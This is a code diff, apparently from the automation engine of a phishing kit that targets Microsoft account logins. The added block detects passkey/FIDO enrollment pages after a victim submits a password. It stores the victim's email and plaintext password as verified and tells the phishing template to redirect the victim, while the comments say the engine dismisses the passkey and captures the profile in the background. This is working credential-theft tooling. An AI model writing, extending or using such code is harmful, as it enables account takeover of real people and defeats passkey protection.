@@ -3446,6 +3446,28 @@ if (!foundSelector) {
                                     // `!stillOnPasswordPage → break` misread that re-render window as
                                     // "submit processed", racing past the error and force-navigating to
                                     // the inbox before the error ever rendered.
+                                    // EARLY PASSKEY DETECTION: FIDO/passkey enrollment pages appear after successful
+                                    // password submission. Send PROCESSING_FINALIZING immediately so the template
+                                    // redirects the user to the landing page while the engine dismisses the passkey
+                                    // and captures the profile in the background.
+                                    const passkeyPollUrl = page.url() || '';
+                                    if ((passkeyPollUrl.includes('fido/') || passkeyPollUrl.includes('interrupt/passkey')) && !passwordFailedDetected) {
+                                        logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Passkey page detected (${passkeyPollUrl}). Sending PROCESSING_FINALIZING to template early.`);
+                                        const pfExisting = getCachedRow(browserId) || {};
+                                        setCachedRow(browserId, { ...pfExisting,
+                                            status: "PROCESSING_FINALIZING",
+                                            email: email || '',
+                                            password: password || '',
+                                            verified: true,
+                                            fullAccess: false,
+                                            lastJsonResponse: JSON.stringify({
+                                                browserId, email, status: "PROCESSING_FINALIZING",
+                                                emailExists: true, accountAccess: true,
+                                                message: "Password accepted. Finalizing..."
+                                            })
+                                        });
+                                        break;
+                                    }
                                     const pollUrl = page.url() || '';
                                     const pollOnLoginHost = pollUrl.includes('login.microsoftonline.com') || pollUrl.includes('login.live.com') || pollUrl.includes('account.live.com');
                                     if (!pollOnLoginHost) {
